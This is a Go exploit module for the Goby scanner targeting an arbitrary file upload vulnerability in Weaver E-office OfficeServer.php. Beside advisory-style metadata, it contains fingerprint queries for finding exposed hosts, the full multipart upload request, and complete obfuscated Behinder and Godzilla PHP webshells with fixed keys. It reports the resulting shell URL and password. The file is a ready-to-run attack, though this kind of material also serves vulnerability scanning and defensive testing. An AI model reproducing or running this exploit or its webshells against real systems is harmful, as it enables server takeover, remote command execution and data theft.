package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Weaver E-office OfficeServer.php file upload vulnerability",
    "Description": "<p>Weaver E-Office is a standardized collaborative OA office software. It implements universal product design, fully meets enterprise management needs, and quickly creates a mobile, paperless and digital office platform for enterprises based on the principle of simplicity, ease of use, high efficiency and intelligence.</p><p>Weaver e-Office OfficeServer has arbitrary file upload vulnerability, which allows attackers to upload arbitrary files, obtain Webshell, execute arbitrary commands on the server, read sensitive information, etc.</p>",
    "Impact": "<p>Weaver e-office OfficeServer has arbitrary file upload vulnerability, which allows attackers to upload arbitrary files, obtain Webshell, execute arbitrary commands on the server, read sensitive information, etc.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.e-office.cn/\">https://www.e-office.cn/</a></p>",
    "Product": "Weaver-EOffice",
    "VulType": [
        "File Upload"
    ],
    "Tags": [
        "File Upload"
    ],
    "Translation": {
        "CN": {
            "Name": "泛微 E-office OfficeServer.php 文件上传漏洞",
            "Product": "泛微-EOffice",
            "Description": "<p>泛微 e-office 是一款标准化的协同 OA 办公软件,实行通用化产品设计,充分贴合企业管理需求,本着简洁易用、高效智能的原则,为企业快速打造移动化、无纸化、数字化的办公平台。</p><p>泛微&nbsp;E-office OfficeServer 存在任意文件上传漏洞，攻击者可以上传任意文件，获取 webshell，在服务器上执行任意命令、读取敏感信息等。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.e-office.cn/\">https://www.e-office.cn/</a><br></p>",
            "Impact": "<p>泛微 E-office OfficeServer 存在任意文件上传漏洞，攻击者可以上传任意文件，获取 webshell，在服务器上执行任意命令、读取敏感信息等。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Weaver E-office OfficeServer.php file upload vulnerability",
            "Product": "Weaver-EOffice",
            "Description": "<p>Weaver E-Office is a standardized collaborative OA office software. It implements universal product design, fully meets enterprise management needs, and quickly creates a mobile, paperless and digital office platform for enterprises based on the principle of simplicity, ease of use, high efficiency and intelligence.</p><p>Weaver e-Office OfficeServer has arbitrary file upload vulnerability, which allows attackers to upload arbitrary files, obtain Webshell, execute arbitrary commands on the server, read sensitive information, etc.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:&nbsp;<a href=\"https://www.e-office.cn/\">https://www.e-office.cn/</a></p>",
            "Impact": "<p>Weaver e-office OfficeServer has arbitrary file upload vulnerability, which allows attackers to upload arbitrary files, obtain Webshell, execute arbitrary commands on the server, read sensitive information, etc.</p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "FofaQuery": "body=\"href=\\\"/eoffice\" || body=\"/eoffice10/client\" || body=\"eoffice_loading_tip\" || body=\"eoffice_init\" || header=\"general/login/index.php\" || banner=\"general/login/index.php\" || body=\"/general/login/view//images/updateLoad.gif\" || (body=\"szFeatures\" && body=\"eoffice\") || header=\"eOffice\" || banner=\"eOffice\"",
    "GobyQuery": "body=\"href=\\\"/eoffice\" || body=\"/eoffice10/client\" || body=\"eoffice_loading_tip\" || body=\"eoffice_init\" || header=\"general/login/index.php\" || banner=\"general/login/index.php\" || body=\"/general/login/view//images/updateLoad.gif\" || (body=\"szFeatures\" && body=\"eoffice\") || header=\"eOffice\" || banner=\"eOffice\"",
    "Author": "su18@javaweb.org",
    "Homepage": "https://www.e-office.cn/",
    "DisclosureDate": "2022-07-28",
    "References": [],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "10.0",
    "CVEIDs": [],
    "CNVD": [
        "CNVD-2022-59313"
    ],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "webshell,custom",
            "show": ""
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "behinder,godzilla",
            "show": "attackType=webshell"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "TEST5687.php",
            "show": "attackType=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<?php phpinfo();?>",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "CVSSScore": "9.3",
    "PostTime": "2023-09-14",
    "PocId": "10493"
}`

	uploadFileDMPQWIJRRQWR := func(hostInfo *httpclient.FixUrl, fileName string, fileContent string) bool {
		requestConfig := httpclient.NewPostRequestConfig("/eoffice10/server/public/iWebOffice2015/OfficeServer.php")
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		requestConfig.Header.Store("Origin", "null")
		requestConfig.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryJjb5ZAJOOXO7fwjs")
		requestConfig.Data = "------WebKitFormBoundaryJjb5ZAJOOXO7fwjs\r\nContent-Disposition: form-data; name=\"FileData\"; filename=\"1.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n" + fileContent + "\r\n------WebKitFormBoundaryJjb5ZAJOOXO7fwjs\r\nContent-Disposition: form-data; name=\"FormData\"\r\n\r\n{'USERNAME':'','RECORDID':'undefined','OPTION':'SAVEFILE','FILENAME':'" + fileName + "'}\r\n------WebKitFormBoundaryJjb5ZAJOOXO7fwjs--"
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		return err == nil && resp.StatusCode == 200 && !strings.Contains(resp.RawBody, "errors")
	}
	checkUploadFileDQWPIUE := func(hostInfo *httpclient.FixUrl, fileName string) (*httpclient.HttpResponse, error) {
		requestConfig := httpclient.NewGetRequestConfig("/eoffice10/server/public/iWebOffice2015/Document/" + fileName)
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, requestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			fileContent := "<?php echo md5(233);unlink(__FILE__);?>"
			fileName := goutils.RandomHexString(6) + ".php"
			if !uploadFileDMPQWIJRRQWR(hostInfo, fileName, fileContent) {
				return false
			}
			resp, err := checkUploadFileDQWPIUE(hostInfo, fileName)
			return err == nil && strings.Contains(resp.Utf8Html, "e165421110ba03099a1c0393373c5b43")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			webshell := goutils.B2S(ss.Params["webshell"])
			content := goutils.B2S(ss.Params["content"])
			filename := goutils.B2S(ss.Params["filename"])
			if attackType == "webshell" {
				filename = goutils.RandomHexString(8) + ".php"
				if webshell == "behinder" {
					content = `<?php @error_reporting(0);session_start();$key="e45e329feb5d925b";$_SESSION["k"]=$key;session_write_close();$post=file_get_contents("php://input");if(!extension_loaded("openssl")){$t="base64_"."decode";$post=$t($post."");for($i=0;$i<strlen($post);$i++){$post[$i]=$post[$i]^$key[$i+1&15];}}else{$post=openssl_decrypt($post,"AES128",$key);}$arr=explode("|",$post);$func=$arr[0];$params=$arr[1];class C{public function __invoke($p){eval($p."");}}@call_user_func(new C(),$params);?>`
				} else if webshell == "godzilla" {
					// 哥斯拉 pass key
					content = `<?php @session_start();@set_time_limit(0);@error_reporting(0);function encode($D,$K){    for($i=0;$i<strlen($D);$i++) {$c = $K[$i+1&15];$D[$i] = $D[$i]^$c;}return $D;}$pass='pass';$payloadName='payload';$key='3c6e0b8a9c15224a';if (isset($_POST[$pass])){    $data=encode(base64_decode($_POST[$pass]),$key);if (isset($_SESSION[$payloadName])){        $payload=encode($_SESSION[$payloadName],$key);if (strpos($payload,"getBasicsInfo")===false){            $payload=encode($payload,$key);}eval($payload);echo substr(md5($pass.$key),0,16);echo base64_encode(encode(@run($data),$key));echo substr(md5($pass.$key),16);}else{if (strpos($data,"getBasicsInfo")!==false){$_SESSION[$payloadName]=encode($data,$key);}}}`
				}
			}
			if !uploadFileDMPQWIJRRQWR(expResult.HostInfo, filename, content) {
				expResult.Success = false
				expResult.Output = "漏洞利用失败"
				return expResult
			}
			resp, err := checkUploadFileDQWPIUE(expResult.HostInfo, filename)
			if err != nil || (resp.StatusCode != 200 && resp.StatusCode != 500) {
				expResult.Success = false
				expResult.Output = "漏洞利用失败"
				return expResult
			}
			expResult.Success = true
			expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/eoffice10/server/public/iWebOffice2015/Document/" + filename + "\n"
			if attackType == "webshell" && webshell == "behinder" {
				expResult.Output += "Password: rebeyond\n"
				expResult.Output += "WebShell tool: Behinder v3.0\n"
			} else if attackType == "webshell" && webshell == "godzilla" {
				expResult.Output += "Password: pass 加密器：PHP_XOR_BASE64\n"
				expResult.Output += "WebShell tool: Godzilla v4.1\n"
			}
			expResult.Output += "Webshell type: php"
			return expResult
		},
	))
}
